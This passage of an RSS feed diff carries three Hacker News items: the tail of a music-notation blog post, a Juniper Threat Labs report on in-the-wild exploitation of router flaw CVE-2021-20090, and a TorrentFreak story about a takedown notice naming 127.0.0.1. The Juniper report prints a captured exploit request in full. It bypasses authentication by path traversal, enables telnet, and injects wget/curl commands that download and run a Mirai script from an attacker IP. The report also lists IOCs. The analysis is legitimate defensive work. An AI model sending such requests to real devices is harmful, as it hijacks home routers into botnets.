+<p>For another, I started digging into this to see how hard it would be to write a small tool to transform StaffPad’s output into something Dorico will understand. I think the answer is: not <em>too</em> hard! I would need to go through each kind of percussion instrument and make sure it transforms it correctly, but that’s the kind of thing I know how to do from other sorts of <abbr>XML</abbr>-mashing in the past.</p>
+<p>While I don’t <em>know</em> that I’ll do that, I now have a pretty good sense of what it would take. It would be some non-trivial amount of work, to be sure; but depending on what my ongoing workflow looks like, it might end up being worth it to me. If it does and I build that tool, I will of course share it here as well as in various forums for the software programs in question. (No promises, though, for real!)</p>
+
+
+
+   </div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 13:17:15 +0000</pubDate>
+      <source>https://v5.chriskrycho.com/journal/musicxml-and-percussion-redux/</source>
+    </item>
+    <item>
+      <title>Freshly disclosed vulnerability CVE-2021-20090 exploited in the wild</title>
+      <link>https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild</link>
+      <description></description>
+      <content:encoded><![CDATA[<img src="https://rss.markdessain.com/feeds/hackernews/https___blogs_juniper_net_en-us_security_freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild/image.jpg" /> 
+<div id="readability-page-1" class="page"><section id="main-content" role="main">
+
+<article>
+	<div>
+					
+			<p>Freshly disclosed vulnerability CVE-2021-20090 exploited in the wild</p>
+							
+			</div>
+	<div>
+
+		<p><span data-contrast="auto"></span></p>
+<p><span data-contrast="auto">Juniper Threat Labs continuously monitors in-the-wild network traffic for malicious activity. Today, we have discovered an active exploitation of a vulnerability that was disclosed just 2 days ago.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">CVE-2021-20090 is a vulnerability that was discovered by Tenable and </span><a href="https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2"><span data-contrast="none">made public</span></a><span data-contrast="auto"> on August 3, 2021. This vulnerability potentially affects millions of home routers (and other IOT devices using the same vulnerable code base) manufactured by no less than 17 vendors according to Tenable research, including some ISPs. The common thread between these devices seems to be firmware from Arcadyan.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">CVE-2021-20090 is a path traversal vulnerability that leads to an authentication bypass. When exploited, the attacker can take over control of the affected device. For example, Tenable has shown how to modify the configuration to enable telnet on a vulnerable router and gain root level shell access to the device.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">As of August 5, we have identified some attack patterns that attempt to exploit this vulnerability in the wild coming from an IP address located in Wuhan, Hubei province, China. The attacker seems to be attempting to deploy a Mirai variant on the affected routers using scripts similar in name to the ones </span><a href="https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/"><span data-contrast="none">mentioned by Palo Alto Networks</span></a><span data-contrast="auto"> in March. We had witnessed the same activity starting February 18. The similarity could indicate that the same threat actor is behind this new attack and attempting to upgrade their infiltration arsenal with yet another freshly disclosed vulnerability. Given that most people may not even be aware of the security risk and won’t be upgrading their device anytime soon, this attack tactic can be very successful, cheap and easy to carry out.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p>Starting June 6, 2021, and through July 23, we have noticed this threat actor start exploiting other vulnerabilities:</p>
+<ol>
+<li>CVE-2020-29557 (DLink routers)</li>
+<li>CVE-2021-1497 and CVE-2021-1498 (Cisco HyperFlex)</li>
+<li>CVE-2021-31755  (Tenda AC11)</li>
+<li><span data-contrast="auto">CVE-2021-22502 (MicroFocus OBR)</span></li>
+<li><span data-contrast="auto">CVE-2021-22506 (MicroFocus AM)</span></li>
+<li>a couple more exploits from exploit-db with no related CVEs.</li>
+</ol>
+<p><span lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span>This </span><span>demon</span><span>s</span><span>trates that</span><span> the group has been continuously adding new exploits to </span><span>its</span><span> arsenal</span><span>.</span><span> The latest</span><span> CVE exploitation</span><span>,</span><span> </span><span>CVE-2021-</span><span>20090</span><span> </span><span>is </span><span>probably not </span><span>the last one to be </span><span>added.</span></span></p>
+<h4 aria-level="2"><span data-contrast="none">Attack Details</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559738&#34;:40,&#34;335559739&#34;:0,&#34;335559740&#34;:259}"> </span></h4>
+<p><span data-contrast="auto">The initial attack originated from the IP address 27.22.80[.]19 over HTTP with the following POST method:</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<pre><span data-contrast="auto">POST /images/..%2fapply_abstract.cgi HTTP/1.1 </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span>
+<span data-contrast="auto">Connection: close </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span>
+<span data-contrast="auto">User-Agent: Dark </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span>
+
+<span data-contrast="auto">action=start_ping&amp;submit_button=ping.html&amp;action_params=blink_time%3D5&amp;ARC_ping_ipaddress=212.192.241.7%0A
+ARC_SYS_TelnetdEnable=1&amp;%0AARC_SYS_=cd+/tmp;
+wget+http://212.192.241.72/lolol.sh;
+curl+-O+http://212.192.241.72/lolol.sh;
+chmod+777+lolol.sh;
+sh+lolol.sh&amp;ARC_ping_status=0&amp;TMP_Ping_Type=4</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></pre>
+<p><span data-contrast="auto">As we can see from this POST request, the attacker will modify the configuration of the attacked device to enable Telnet using “ARC_SYS_TelnetdEnable=1” then proceeds to download a new script from the IP address 212.192.241[.]72 using either wget or curl and then executes it.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">We obtained a copy of the payload and confirmed it is a Mirai botnet variant. It weas interesting to note that this botnet removes previous Mirai infections to clean the slate for itself.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<h4 aria-level="2"><span data-contrast="none">Conclusion</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559738&#34;:40,&#34;335559739&#34;:0,&#34;335559740&#34;:259}"> </span></h4>
+<p><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span><span data-contrast="auto">It is clear that threat actors keep an eye on all disclosed vulnerabilities. Whenever an exploit POC is published, it often takes them very little time to integrate it into their platform and launch attacks. Most organizations do not have policies to patch within a few days, taking sometimes weeks to react. But in the case of IOT devices or home gateways, the situation is much worse as most users are not tech saavy and even those who are do not get informed about potential vulnerabilities and patches to apply. It is clear to me that the only sure way to remedy this issue is to require vendors to offer 0-down-time automatic updates.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">Juniper Networks Advanced Threat Protection with SecIntel provides protection against these attacks.</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<h4 aria-level="2"><span data-contrast="none">IOCs</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559738&#34;:40,&#34;335559739&#34;:0,&#34;335559740&#34;:259}"> </span></h4>
+<p><span data-contrast="auto">Attack source IP: 27.22.80[.]19</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+<p><span data-contrast="auto">Shell script and binaries downloaded from: 212.192.241[.]72</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559739&#34;:160,&#34;335559740&#34;:259}"> </span></p>
+
+<p><span data-contrast="auto">Shell script:</span></p>
+
+<p><span data-contrast="auto">Dark binaries:</span></p>
+<table data-tablestyle="MsoTableGrid" data-tablelook="1696" aria-rowcount="9">
+<tbody>
+<tr aria-rowindex="1">
+<td data-celllook="0"><span data-contrast="auto">73edf8bfbbeaccdd84204f24402dcf488c3533be2682724e5906396b9237411d  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.arm5</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="2">
+<td data-celllook="0"><span data-contrast="auto">8bb454cd942ce6680f083edf88ffa31661a47a45eb3681e1b36dd05043315399  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.mips</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="3">
+<td data-celllook="0"><span data-contrast="auto">f83eadaa00e81ad51e3ab479b900b981346895b99d045a6b6f77491c3132b58c</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.m68k</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="4">
+<td data-celllook="0"><span data-contrast="auto">e4bc34e321b31926fd2fa1696136187b13864dfa03fba6848e59f9f72bfa9529  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.sh4</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="5">
+<td data-celllook="0"><span data-contrast="auto">80331cf89f3e6026b33b8f1bfa1c304295b9327311661d7927f78824f04cf528  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.arm6</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="6">
+<td data-celllook="0"><span data-contrast="auto">904f9b2e029595365f4f4426069b274810510908c7dd23a3791a831f51e9f1fc  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.mpsl</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="7">
+<td data-celllook="0"><span data-contrast="auto">283f932f30756408a59dac97a6965eb792915242214d590eab1c6cb049148582  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.x86</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="8">
+<td data-celllook="0"><span data-contrast="auto">c2f5bbf35afc7335f789e420c23c43a069ecfcca1a8f9fac5cd554a7a769440e  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.arm7</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+<tr aria-rowindex="9">
+<td data-celllook="0"><span data-contrast="auto">70764ef9800c1d09f965fbb9698d0eda52448b23772d118f2f2c4ba37b59fc20  </span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+<td data-celllook="0"><span data-contrast="auto">dark.ppc</span><span data-ccp-props="{&#34;201341983&#34;:0,&#34;335559740&#34;:259}"> </span></td>
+</tr>
+</tbody>
+</table>
+
+
+	</div>
+	
+</article>
+
+
+
+
+		
+	
+ </section></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 12:55:56 +0000</pubDate>
+      <source>https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild</source>
+    </item>
+    <item>
+      <title>Anti-Piracy Firm Asks Google to Block 127.0.0.1</title>
+      <link>https://torrentfreak.com/anti-piracy-firm-asks-google-to-block-127-0-0-1-210808/</link>
+      <description></description>
+      <content:encoded><![CDATA[<img src="https://rss.markdessain.com/feeds/hackernews/https___torrentfreak_com_anti-piracy-firm-asks-google-to-block-127-0-0-1-210808_/image.jpg" /> 
+<div id="readability-page-1" class="page"><div>
+<section>
+<article>
+<header>
+<p>
+
+<span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to TorrentFreak." href="https://torrentfreak.com"><span property="name">Home</span></a><meta property="position" content="1"/></span> &gt; <span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to the Anti-Piracy category archives." href="https://torrentfreak.com/category/anti-piracy/"><span property="name">Anti-Piracy</span></a><meta property="position" content="2"/></span> &gt; <span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to the DMCA category archives." href="https://torrentfreak.com/category/anti-piracy/dmca/"><span property="name">DMCA</span></a><meta property="position" content="3"/></span> &gt; <span></span>
+</p>
+<p>
+<span> </span>
+Ukrainian TV channel TRK has sent a rather bizarre takedown request to Google. The company&#39;s anti-piracy partner Vindex asked the search engine to remove a search result that points to 127.0.0.1. Tech-savvy people will immediately recognize that the anti-piracy company apparently found copyright-infringing content on its own server.
+</p>
+</header>
+<div>
+<p>While search engines are extremely helpful for the average Internet user, copyright holders also see a massive downside.</p>
+<p>The fact that “infringing sites” show up in search results has become a source of frustration. As a result, Google and other search engines are facing a steady stream of DMCA takedown notices.</p>
+<p>Google alone has processed more than <a href="https://torrentfreak.com/copyright-holders-asked-google-to-remove-5-billion-pirate-links-210206/">five billion takedown requests</a> and millions of new URLs are reported every week. While the majority of these correctly point to problematic links, there are plenty of mistakes too. </p>
+<p>Some copyright holders flag perfectly <a href="https://torrentfreak.com/reckless-dmca-takedown-purges-legitimate-websites-from-google-search-210417/">legitimate websites as piracy havens</a>, which others shoot themselves in the foot by targeting their own websites. The latter happened to the webtoon <a href="https://torrentfreak.com/toomics-reports-its-own-website-for-copyright-infringements/">subscription service Toomics</a> just recently. </p>
+<h2>Please Take 127.0.0.1 Offline</h2>
+<p>This week we saw yet another problematic DMCA notice, which is perhaps even worse. TV channel <a href="https://en.wikipedia.org/wiki/Ukraine_(TV_channel)#:~:text=Ukraine%20(officially%20TRK%20Ukraina%3B%20%D0%A3%D0%BA%D1%80%D0%B0%D1%97%D0%BD%D0%B0,which%20is%20part%20of%20SCM.">TRK Ukraine</a> asked Google to remove content hosted on the IP-address <a href="https://en.wikipedia.org/wiki/Localhost">127.0.0.1</a>, which is the localhost of a device or server. </p>
+<center></center>
+<p>The request was sent by TKR’s anti-piracy partner <a href="https://vindex.com.ua/">Vindex</a>, which essentially flagged a file on its own machine. The ‘infringing’ link is 127.0.0.1:6878/ace/manifest.m3u. This points to a playlist file, possibly for the P2P streaming platform <a href="https://en.wikipedia.org/wiki/Ace_Stream">Ace Stream</a> that’s often used to pirate content. </p>
+<h2>‘Illegal Content’</h2>
+<p>According to the takedown notice, all reported links “illegally provide external links with which users can access and/or download unauthorized copyrighted contents of Football.” That would then include the file on Vindex’s computer. </p>
+<p>Since 127.0.0.1 refers to the host computer, Google is technically asked to remove a file from its servers. A file that doesn’t exist. Needless to say, Google hasn’t taken any action in response.</p>
+<p>The above suggests that Vindex may want to take a good look at its takedown bots. The company doesn’t have a stellar reputation when it comes to DMCA notices. Of <a href="https://transparencyreport.google.com/copyright/reporters/27882?request_by_org=size:10;org:27882;p:MzoyNzg4MjoxMDo1MDo2MA&amp;lu=request_by_org">all the links</a> that were reported to Google, little more than 10% were removed by the search engine. </p>
+</div>
+</article>
+
+
+
+
+</section>
+
+</div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 13:20:23 +0000</pubDate>
+      <source>https://torrentfreak.com/anti-piracy-firm-asks-google-to-block-127-0-0-1-210808/</source>
+    </item>
   </channel>
 </rss>
